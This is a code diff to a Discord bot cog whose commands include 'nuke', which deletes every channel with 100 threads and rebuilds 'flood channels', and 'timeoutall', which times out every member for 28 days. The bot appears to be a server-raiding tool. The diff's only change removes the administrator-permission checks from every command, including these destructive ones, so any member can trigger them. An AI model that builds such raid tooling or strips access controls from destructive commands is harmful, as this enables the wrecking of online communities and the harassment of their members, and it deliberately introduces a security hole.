@@ -29,13 +29,11 @@ class Control(commands.Cog):
 
     # ── /stop + .stop ──────────────────────────────────────────────────────────
     @app_commands.command(name="stop", description="Immediately stop all running operations.")
-    @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def stop(self, interaction: discord.Interaction) -> None:
         await interaction.response.send_message(self._do_stop())
 
     @commands.command(name="stop")
-    @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def stop_prefix(self, ctx: commands.Context) -> None:
         await ctx.send(self._do_stop())
@@ -55,13 +53,11 @@ class Control(commands.Cog):
 
     # ── /status + .status ──────────────────────────────────────────────────────
     @app_commands.command(name="status", description="Show current operation status.")
-    @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def status(self, interaction: discord.Interaction) -> None:
         await interaction.response.send_message(self._do_status(), ephemeral=True)
 
     @commands.command(name="status")
-    @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def status_prefix(self, ctx: commands.Context) -> None:
         await ctx.send(self._do_status())
@@ -77,13 +73,11 @@ class Control(commands.Cog):
     # ── /setratelimit + .setratelimit ──────────────────────────────────────────
     @app_commands.command(name="setratelimit", description="Change intensity live (1–10).")
     @app_commands.describe(level="1–10")
-    @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def setratelimit(self, interaction: discord.Interaction, level: int) -> None:
         await interaction.response.send_message(self._do_setratelimit(level), ephemeral=True)
 
     @commands.command(name="setratelimit", aliases=["setrl"])
-    @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def setratelimit_prefix(self, ctx: commands.Context, level: int = 10) -> None:
         await ctx.send(self._do_setratelimit(level))
@@ -96,13 +90,11 @@ class Control(commands.Cog):
 
     # ── /bypassstats + .bypassstats ────────────────────────────────────────────
     @app_commands.command(name="bypassstats", description="Show task and operation stats.")
-    @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def bypassstats(self, interaction: discord.Interaction) -> None:
         await interaction.response.send_message(self._do_stats(), ephemeral=True)
 
     @commands.command(name="bypassstats", aliases=["bpstats"])
-    @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def bypassstats_prefix(self, ctx: commands.Context) -> None:
         await ctx.send(self._do_stats())
@@ -120,7 +112,6 @@ class Control(commands.Cog):
     # ── /nuke + .nuke ──────────────────────────────────────────────────────────
     @app_commands.command(name="nuke", description="☢️ Delete every channel instantly via 100-thread queue, optionally rebuild.")
     @app_commands.describe(rebuild="Create 100 flood channels after nuking. Default True.")
-    @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def nuke(self, interaction: discord.Interaction, rebuild: bool = True) -> None:
         if bot_state.active_simulation:
@@ -139,7 +130,6 @@ class Control(commands.Cog):
         )
 
     @commands.command(name="nuke")
-    @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def nuke_prefix(self, ctx: commands.Context, rebuild: str = "true") -> None:
         if bot_state.active_simulation:
@@ -198,7 +188,6 @@ class Control(commands.Cog):
 
     # ── /timeoutall + .timeoutall ──────────────────────────────────────────────
     @app_commands.command(name="timeoutall", description="⏱️ Timeout every member for 28 days.")
-    @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def timeoutall(self, interaction: discord.Interaction) -> None:
         if bot_state.active_simulation:
@@ -210,7 +199,6 @@ class Control(commands.Cog):
         await self._run_timeoutall(interaction.guild, interaction.user.id, interaction.followup.send)
 
     @commands.command(name="timeoutall", aliases=["toa"])
-    @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def timeoutall_prefix(self, ctx: commands.Context) -> None:
         if bot_state.active_simulation:
